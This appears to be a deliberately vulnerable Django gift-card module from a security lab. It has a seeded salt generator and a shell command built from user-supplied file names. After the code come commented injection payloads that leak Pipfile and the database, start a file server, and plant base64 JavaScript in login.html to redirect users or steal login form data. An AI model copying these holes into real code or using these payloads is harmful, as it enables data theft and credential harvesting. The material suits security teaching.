import json
from binascii import hexlify
from hashlib import sha256
from django.conf import settings
from os import urandom, system

SEED = settings.RANDOM_SEED
CARD_PARSER = 'giftcardreader'

# KG: Something seems fishy here. Why are we seeding here?
def generate_salt(length, debug=True):
    import random
    random.seed(SEED)
    return hexlify(random.randint(0, 2**length-1).to_bytes(length, byteorder='big'))

def hash_pword(salt, pword):
    assert(salt is not None and pword is not None)
    hasher = sha256()
    hasher.update(salt)
    hasher.update(pword.encode('utf-8'))
    return hasher.hexdigest()

def parse_salt_and_password(user):
    return user.password.split('$')

def check_password(user, password): 
    salt, password_record = parse_salt_and_password(user)
    verify = hash_pword(salt.encode('utf-8'), password)
    if verify == password_record:
        return True
    return False

def write_card_data(card_file_path, product, price, customer):
    data_dict = {}
    data_dict['merchant_id'] = product.product_name
    data_dict['customer_id'] = customer.username
    data_dict['total_value'] = price
    record = {'record_type':'amount_change', "amount_added":2000,'signature':'[ insert crypto signature here ]'}
    data_dict['records'] = [record,]
    with open(card_file_path, 'w') as card_file:
        card_file.write(json.dumps(data_dict))

def parse_card_data(card_file_data, card_path_name):
    print(card_file_data)
    try:
        test_json = json.loads(card_file_data)
        return card_file_data
    except (json.JSONDecodeError, UnicodeDecodeError):
        pass
    with open(card_path_name, 'wb') as card_file:
        card_file.write(card_file_data)
    # KG: Are you sure you want the user to control that input?
    command = f"./{CARD_PARSER} 2 {card_path_name} > tmp_file" # XXX command injection
    print("About to execute '"+command+"'")
    ret_val = system(command) 
    if ret_val != 0:
        return card_file_data
    with open("tmp_file", 'r') as tmp_file:
        return tmp_file.read()

# './giftcardreader 2 /tmp/potato_7_parser.gftcrd > tmp_file'
# './giftcardreader 2 /tmp/{}_7_parser.gftcrd > tmp_file'
# './giftcardreader 2 /tmp/{somefile; cat Pipfile >> templates/navbar.html; echo}_7_parser.gftcrd > tmp_file'

# .gft; cat Pipfile >> templates/navbar.html; echo ""
# NOT a valid filename (slash!) so it fails

# .gft; cp Pipfile templates; cd templates; cat Pipfile >> navbar.html; rm -f Pipfile; cd ..; echo "success";
# THIS ONE WORKS. Can't use slashes or pushd popd because `sh`

# .gft; cp db.sqlite3 templates; cd templates; cp db.sqlite3 images; cd images; mv db.sqlite3 db.jpg; cd ..; cd ..; cd ..; echo "success";

# .gft; cd ..; cd ..; cd ..; cd ..; cd ..; cd ..; python2 -m SimpleHTTPServer 8001; echo "success";


# .gft; cd templates ; echo "<body onload='eval(atob(\"   Put any base64-encoded js here... use btoa()!   \"))'>" >> login.html;

# redir to lzrd.xyz
# .gft; cd templates ; echo "<body onload='eval(atob(\"d2luZG93LmxvY2F0aW9uPSJodHRwczovL2x6cmQueHl6Ig==\"))'>" >> login.html;

# alert
# .gft; cd templates ; echo "<body onload='eval(atob(\"YWxlcnQoJ3lvdSBoYXZlIGJlZW4gaGFja2VkJyk=\"))'>" >> login.html;

# $('form')[0].action='http://localhost:6969/hacked.html'
# "JCgnZm9ybScpWzBdLmFjdGlvbj0naHR0cDovL2xvY2FsaG9zdDo2OTY5L2hhY2tlZC5odG1sJw=="
# .gft; cd templates ; echo "<body onload='eval(atob(\""JCgnZm9ybScpWzBdLmFjdGlvbj0naHR0cDovL2xvY2FsaG9zdDo2OTY5L2hhY2tlZC5odG1sJw=="\"))'>" >> login.html;

# SLASHES! DO! NOT! WORK!
# .gft; cd templates ; echo "<img onload='window.location='//lzrd.xyz''>" >> login.html;

# .gft; python2 -m SimpleHTTPServer 8001; echo "success";

# .gft; python3 -m http.server 8001; echo "success";

# .gft; python3 -m http.server 8001 &; echo "success";


# .gft; gedit potato.txt; echo ""
# NOT a valid filename so it fails

# .gft; gedit potato.txt; echo "look ma!"; echo ""